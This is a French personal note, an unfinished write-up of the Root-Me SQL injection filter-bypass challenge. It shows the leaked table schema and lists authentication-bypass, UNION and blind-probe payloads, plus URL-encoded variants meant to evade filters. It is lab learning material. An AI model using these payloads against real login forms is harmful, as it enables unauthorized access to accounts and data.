<script src="../../../js/password-protect.js"></script>

---
categorie: web-server
tags:
  - rootme
  - "#informatique/cyber"
lien: https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Contournement-de-filtres
---
# But

se connecter en admin avec une injection SQL

# Fourni

une login page avec une autre page qui nous annonce qu'un compte avec pour user "admin" et id "1" existe
on sait aussi qu'il faudra faire un contournement de filtre

Je vois dans le code source : 

```
<!--
// CREATE TABLE IF NOT EXISTS `membres` (
//   `id` int(1) NOT NULL AUTO_INCREMENT,
//   `username` VARCHAR(5) NOT NULL,
//   `pass` VARCHAR(20) NOT NULL,
//   `email` VARCHAR( 50 ) NOT NULL,
//   PRIMARY KEY (`id`)
// ) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;
-->
```

je sais donc que c'est une bd "MyISAM" et j'ai aussi le nom de champs
# Méthode de résolution

il faudrait que je me mette à utiliser sqlmap et les autres outils d'injection SQL

[root me a une fiche d'aide pour cela ](https://www.root-me.org/Outil-Sqlmap)


Payload testé pour login
```
' OR 1=1--
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1#
' OR 1=1/*

' OR 'a'='a'--
' OR 'a'='a'#
' OR 'a'='a'/*
' OR 1=2 UNION SELECT 1,2,3--
' OR EXISTS(SELECT 1 FROM members)--

' OR username LIKE 'adm%'--
' OR ASCII(SUBSTRING((SELECT database()),1,1))>64--
' OR LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1))>1--

admin'--
admin'#
admin'/*
```

Payloads testés pour le pass
```
' OR 1=1--
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1#
' OR 1=1/*

1234' OR 'a'='a'--
1234' OR '1'='1'--
1234' OR 1=1#
1234' OR 1=2 UNION SELECT 1,2,3--

' OR (SELECT COUNT(*) FROM information_schema.tables)>0--
' OR (SELECT LENGTH(username) FROM members LIMIT 1)=5--
' OR password LIKE 'pa%'--
```

Il faut ensuite tester avec des caractères url encodés, au cas ou il y aurai des filtres

```
|   |
|---|
|%27%20OR%201%3D1--|
|%27%20OR%20%271%27%3D%271%27--|
|%27%20OR%20%271%27%3D%271%27%23|
|%27%20OR%201%3D1%23|
|%27%20OR%201%3D1%2F%2A|
||
|%27%20OR%20%27a%27%3D%27a%27--|
|%27%20OR%20%27a%27%3D%27a%27%23|
|%27%20OR%20%27a%27%3D%27a%27%2F%2A|
|%27%20OR%201%3D2%20UNION%20SELECT%201%2C2%2C3--|
|%27%20OR%20EXISTS%28SELECT%201%20FROM%20members%29--|
||
|%27%20OR%20username%20LIKE%20%27adm%25%27--|
|%27%20OR%20ASCII%28SUBSTRING%28%28SELECT%20database%28%29%29%2C1%2C1%29%29%3E64--|
|%27%20OR%20LENGTH%28%28SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201%29%29%3E1--|
... (20lignes restantes)
```